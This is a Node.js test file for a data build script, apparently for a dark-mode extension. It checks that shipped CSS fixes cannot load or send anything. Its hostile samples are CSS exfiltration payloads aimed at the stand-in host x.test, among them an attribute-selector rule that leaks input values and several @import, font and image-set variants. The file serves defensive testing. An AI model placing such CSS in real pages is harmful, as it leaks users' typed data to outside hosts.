import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { REPO } from '../helpers/tree.mjs';

const { buildData } = await import(pathToFileURL(join(REPO, 'scripts', 'data', 'build.mjs')).href);
const VERIFIED = { date: '2026-10-15', browsers: ['chromium'], test: 'unit' };

function source(fixes) {
  const root = mkdtempSync(join(tmpdir(), 'dk-sec-data-'));
  mkdirSync(join(root, 'data-src', 'fixes'), { recursive: true });
  writeFileSync(join(root, 'data-src', 'fixes', 'a.json'), JSON.stringify(fixes));
  writeFileSync(join(root, 'data-src', 'dark-sites.json'), '[]');
  return root;
}

test('SEC: a shipped fix cannot load or send anything through its CSS', async () => {
  const css = (text) => ({ note: 'n', verified: VERIFIED, dynamic: { css: text } });
  const hostile = {
    'a.example': css('input[value^="a"]{background:url(https://x.test/a)}'),
    'b.example': css('@import "https://x.test/a.css";'),
    'c.example': css('@import url(//x.test/a.css);'),
    'd.example': css('a{background:image-set("https://x.test/a.png" 1x)}'),
    'e.example': css(String.raw`a{background:\75rl(https://x.test/a)}`),
    'f.example': css('@font-face{font-family:x;src:url(https://x.test/f.woff2)}'),
    'g.example': css('a{content:attr(href);cursor:src("https://x.test/c.png")}'),
  };
  const { errors } = await buildData(source(hostile));
  for (const host of Object.keys(hostile)) assert.ok(errors.some((e) => e.includes(host)), `${host} was accepted\n${errors.join('\n')}`);
});

test('SEC: a shipped fix with plain color rules is accepted', async () => {
  const { errors } = await buildData(source({ 'ok.example': { note: 'n', verified: VERIFIED, dynamic: { css: '.logo{color:#fff}\n.card{background:var(--bg)}' } } }));
  assert.deepEqual(errors, []);
});
